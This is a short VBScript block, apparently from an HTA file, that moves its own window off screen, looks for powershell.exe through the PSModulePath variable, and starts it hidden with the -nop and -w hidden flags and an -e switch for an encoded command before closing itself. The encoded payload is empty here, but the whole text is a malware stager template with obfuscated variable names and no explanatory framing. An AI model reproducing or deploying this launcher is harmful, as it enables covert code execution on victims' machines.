<script language="VBScript">
  window.moveTo -4000, -4000
  Set obY = CreateObject("Wscript.Shell")
  Set pYfQh40c = CreateObject("Scripting.FileSystemObject")
  For each path in Split(obY.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If pYfQh40c.FileExists(path + "\..\powershell.exe") Then
      obY.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
